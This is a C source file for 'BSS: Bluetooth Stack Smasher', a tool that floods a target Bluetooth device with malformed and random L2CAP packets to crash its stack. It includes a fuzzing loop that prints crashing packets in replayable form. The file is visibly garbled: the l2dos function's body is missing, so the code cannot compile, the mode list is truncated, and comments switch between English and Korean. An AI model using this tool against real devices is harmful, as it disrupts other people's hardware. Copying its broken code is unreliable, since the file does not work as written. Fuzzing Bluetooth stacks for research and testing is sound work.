/*
 * BSS: Bluetooth Stack Smasher
 * This tool intends to perform several tests on the L2CAP layer 
 * of the bluetooth protocol.
 *
 * Pierre BETOUIN <pierre.betouin@security-labs.org>
 * 
 * You may need to install the libbluetooth (-dev) first. 
 * Debian : apt-get install libbluetooth1-dev
 *
 * Copyright (C) 2006 Pierre BETOUIN
 * 
 * Written 2006 by Pierre BETOUIN <pierre.betouin@security-labs.org>
 * 
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation;
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT OF THIRD PARTY
 * RIGHTS.  IN NO EVENT SHALL THE COPYRIGHT HOLDER(S) AND AUTHOR(S) BE LIABLE
 * FOR ANY CLAIM, OR ANY SPECIAL INDIRECT OR CONSEQUENTIAL DAMAGES, OR ANY
 * DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN
 * AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
 * OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
 * 
 * ALL LIABILITY, INCLUDING LIABILITY FOR INFRINGEMENT OF ANY PATENTS,
 * COPYRIGHTS, TRADEMARKS OR OTHER RIGHTS, RELATING TO USE OF THIS SOFTWARE
 * IS DISCLAIMED.
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/l2cap.h>
#include <asm/byteorder.h>

#define MAXSIZE		4096
#define IT		512
#define LENGTH		20
#define	BUFCODE		100

int usage(char *);
void l2dos(char *, int, int, char);
void l2fuzz(char *bdstr_addr, int maxsize, int maxcrash);
char *code2define(int code);

void l2dos(char *bdstr_addr, int cmdnum, int siz, char pad)
//------------------------------------------------------------------------------
// Function: l2dos
// Description: Send L2CAP commands to a Bluetooth device using raw socket
// Parameters:
//  bdstr_addr - Bluetooth address of the device
//  cmdnum - L2CAP command number
//  siz - Size of the packet
//  pad - Padding byte
//---------------------------------------------------------//

{

/*
 * Function: l2fuzz
 * Description: L2CAP protocol fuzzing tool to find crashes in Bluetooth stacks
 */
void l2fuzz(char *bdstr_addr, int maxsize, int maxcrash)
{
    // Initialize variables
    char *buf, *savedbuf;
    struct sockaddr_l2 addr;
    int sock, i, size;
    int crash_count = 0, savedsize;

    // Create a socket and bind it to a Bluetooth interface
    if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    // Initialize a L2CAP address
    memset(&addr, 0, sizeof(addr));
    addr.l2_family = AF_BLUETOOTH;

    // Bind the socket to a Bluetooth device
    if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
        perror("bind");
        exit(EXIT_FAILURE);
    }

    // Connect to the Bluetooth device
    str2ba(bdstr_addr, &addr.l2_bdaddr);
    if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
        perror("connect");
        exit(EXIT_FAILURE);
    }

    // Allocate memory for a buffer
    if (!(savedbuf = (char *) malloc ((int) maxsize + 1))) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }

    // Infinite loop for packet fuzzing
    while (1) {
        // Generate a random packet size
        size = rand() % maxsize;
        if (size == 0)
            size = 1;

        // Allocate memory for a packet
        if (!(buf = (char *) malloc ((int) size + 1))) {
            perror("malloc");
            exit(EXIT_FAILURE);
        }

        // Initialize the packet with random data
        bzero(buf, size);
        for (i = 0 ; i < size ; i++)
            buf[i] = (char) rand();

        // Send the packet to the Bluetooth device
        if (send(sock, buf, size, 0) <= 0) {
            // Handle packet sending failure
            crash_count++;
            // Print crash message
            fprintf(stdout, "\n%s BT stack may have crashed. This device seems to be vulnerable to buggy packets.\n", bdstr_addr);
            // Print crash details
            fprintf(stdout, "\t----------------------------------------------------\n");
            fprintf(stdout, "\tHost\t\t%s\n", bdstr_addr);
            fprintf(stdout, "\tPacket size\t%d\n", savedsize);
            fprintf(stdout, "\t----------------------------------------------------\n");
            fprintf(stdout, "\tPacket dump\n\t");
            for (i = 0 ; i < savedsize ; i++) {
                fprintf(stdout, "0x%.2X ", (unsigned char) savedbuf[i]);
                if ( (i % 30) == 29)
                    fprintf(stdout, "\n\t");
            }
            fprintf(stdout, "\n\t----------------------------------------------------\n");

            // Print a replayable buggy packet
            fprintf(stdout, "char replay_buggy_packet[]=\"");
            for (i = 0 ; i < savedsize ; i++) {
                fprintf(stdout, "\\x%.2X", (unsigned char) savedbuf[i]);
            }
            fprintf(stdout, "\";\n");

            // Exit if maxcrash limit is reached
            if ((crash_count == maxcrash) && (maxcrash != 0) && (maxcrash >= 0)) {
                free(buf);
                free(savedbuf);
                exit(EXIT_SUCCESS);
            }

        }

        // Store the previous packet
        memcpy(savedbuf, buf, size);
        savedsize = size;

        // Free memory
        free(buf);
    }
}

/**
 * usage
 *
 * This function prints the usage message for the BSS (Bluetooth Stack Smasher) tool.
 * The function takes a single argument `name` which is the name of the executable.
 * The message includes a brief description of the tool and lists the available options.
 * The function then exits with an error code.
 *
 * @param name The name of the executable
 */
int usage(char *name)
{
	fprintf(stderr, "BSS: Bluetooth Stack Smasher\n");
	fprintf(stderr, "Usage: %s [-s size] [-m mode] [-p pad_byte] [-M maxcrash_count] <bdaddr>\n", name);
	fprintf(stderr, "Modes are :\n");
	// ... truncated list of modes ...
	fprintf(stderr, "\n");
	exit(EXIT_FAILURE);
}


/**
 * 코드를 정의하는 함수
 * @param code 코드의 값
 * @return 정의된 코드의 문자열
 */
char *code2define(int code)
{
    /**
     * 할당된 메모리 할당
     * @param size 할당할 크기
     * @return 할당된 메모리 포인터
     */
    char *strcode = malloc(BUFCODE + 1);
    
    switch(code)
    {
        case L2CAP_ECHO_REQ:
            /**
             * L2CAP echo request 정의
             */
            strcpy(strcode, "L2CAP echo request");	
            break;
        
        case L2CAP_COMMAND_REJ:
            /**
             * L2CAP command reject 정의
             */
            strcpy(strcode, "L2CAP command reject");	
            break;
            
        case L2CAP_CONN_REQ:
            /**
             * L2CAP connection request 정의
             */
            strcpy(strcode, "L2CAP connection request");	
            break;
            
        case L2CAP_CONN_RSP:
            /**
             * L2CAP connexion response 정의
             */
            strcpy(strcode, "L2CAP connexion response");	
            break;
            
        case L2CAP_CONF_REQ:
            /**
             * L2CAP configuration request 정의
             */
            strcpy(strcode, "L2CAP configuration request");	
            break;
            
        case L2CAP_CONF_RSP:
            /**
             * L2CAP configuration response 정의
             */
            strcpy(strcode, "L2CAP configuration response");	
            break;
            
        case L2CAP_DISCONN_REQ:
            /**
             * L2CAP disconnection request 정의
             */
            strcpy(strcode, "L2CAP disconnection request");	
            break;
            
        case L2CAP_DISCONN_RSP:
            /**
             * L2CAP disconnection response 정의
             */
            strcpy(strcode, "L2CAP disconnection response");	
            break;
            
        case L2CAP_ECHO_RSP:
            /**
             * L2CAP echo response 정의
             */
            strcpy(strcode, "L2CAP echo response");	
            break;
            
        case L2CAP_INFO_REQ:
            /**
             * L2CAP info request 정의
             */
            strcpy(strcode, "L2CAP info request");	
            break;
            
        case L2CAP_INFO_RSP:
            /**
             * L2CAP info response 정의
             */
            strcpy(strcode, "L2CAP info response");	
            break;
            
        default:
            /**
             * 이 코드에는 해당하는 코드가 없음
             */
            strcode = NULL;
    }
    return strcode;
}

/**
 * MAIN FUNCTION
 * 
 * This function is the entry point of the program. It checks if the user has sufficient permissions
 * to run the program and parses command-line arguments.
 */
int main(int argc, char **argv)
{
    /**
     * Initialize variables
     */
    int i, siz = 0, mode = 0, maxcrash=1;
    char bdaddr[20], pad=0;

    /**
     * Check if the user has root privileges
     */
    if(getuid() != 0)
    {
        fprintf(stderr, "You need to be root to launch %s (raw socket)\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    
    /**
     * Check the number of command-line arguments
     */
    if(argc < 2 || argc > 9)
    {
        usage(argv[0]);
    }
    
    /**
     * Parse command-line arguments
     */
    for(i = 0; i < argc; i++){
        /**
         * Check if the argument contains a colon
         */
        if(strchr(argv[i], ':'))
            strncpy(bdaddr, argv[i], 18);
        else
        {
            /**
             * Parse options
             */
            if(!memcmp(argv[i], "-s", 2) && (siz = atoi(argv[++i])) < 0)
                usage(argv[0]);
            
            if(!memcmp(argv[i], "-m", 2) && (mode = atoi(argv[++i])) < 0)
                usage(argv[0]);
            
            if(!memcmp(argv[i], "-p", 2) && (pad = (*argv[++i])) < 0)
                usage(argv[0]);
            
            if(!memcmp(argv[i], "-M", 2) && (maxcrash = atoi(argv[++i])) < 0)
                usage(argv[0]);
        }
    }

    /**
     * Check the mode value
     */
    if(mode > 12)
    {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    /**
     * Perform actions based on the mode
     */
    if(mode == 0)
    {
        for(i=1; i <= 0x0b; i++)
            l2dos(bdaddr, i, siz?siz:MAXSIZE, pad);
        l2fuzz(bdaddr, siz?siz:MAXSIZE, maxcrash);
    }
    else
    {
        if(mode <= 11)
            l2dos(bdaddr, mode, siz?siz:MAXSIZE, pad);
        if(mode == 12)
            l2fuzz(bdaddr, siz?siz:MAXSIZE, maxcrash);
    }
    
    /**
     * Print a success message
     */
    fprintf(stdout, "\nYour bluetooth device didn't crash receiving the packets\n");
    
    return EXIT_SUCCESS;
}
